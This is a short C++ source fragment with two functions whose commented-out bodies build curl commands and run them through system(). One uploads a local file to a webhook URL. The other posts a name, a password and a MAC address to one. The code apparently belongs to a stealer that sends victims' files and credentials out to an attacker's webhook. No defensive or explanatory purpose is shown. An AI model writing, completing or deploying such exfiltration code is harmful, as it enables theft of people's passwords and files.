#include <iostream>
#include <string>
using namespace std;

void webhook_file(string url, string path) {
	//string webhook_file_cmd = "curl -F x=@\"" + path + "\" " + url;
	//system(webhook_file_cmd.c_str());
}

void webhook_message(string url, string gname, string gpass, string gmac) {
	//string webhook_msg_command = "curl -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"" + gname + "                                                                        " + gpass + "                                                                        " + gmac +"\\\"}\" " + url;
	//system(webhook_msg_command.c_str());
}